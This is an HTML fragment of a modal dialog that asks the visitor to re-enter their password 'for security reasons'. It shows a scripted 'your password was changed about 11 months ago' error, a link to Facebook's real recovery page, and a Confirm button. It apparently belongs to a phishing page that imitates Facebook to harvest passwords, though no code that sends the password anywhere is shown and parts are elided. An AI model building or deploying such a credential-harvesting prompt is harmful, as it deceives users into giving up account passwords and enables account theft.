<div class="modal" id="passwordmd" tabindex="-1" aria-labelledby="policyModalLabel" aria-hidden="true" role="dialog">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="policyModalLabel">Enter your password to continue.</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <span>For security reasons enter your password to continue.</span>
                <div class="action-button-list">
                    <div class="input-wrapper">
                        <label for="OldPasswordField" class="form-label"></label>
                        <input name="old-password" type="password" class="form-control" id="OldPasswordField" placeholder="Enter your password" required="">
                    ...
                    <div class="mb-2 invalid-feedback" id="saipassword" style="display: none;">
                        Your password was changed about 11 months ago. If you don't remember the change.
                        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" id="forgotPasswordLink" class="forgot-password-link" target="_blank" rel="noopener noreferrer">Forgot password.</a>
                    </div>
                    <div class="mb-2 invalid-feedback" id="pleasefill" style="display: none;">Enter your password to continue!</div>
                    <br>
                    <div id="SaveButton" class="form-btn-wrapper">
                        <button class="btn btn-primary">
                            ...
                            <span class="button-text" style="font-weight: bold;">Confirm</span>
                        </button>
                    </div>
                </div>
            </div>
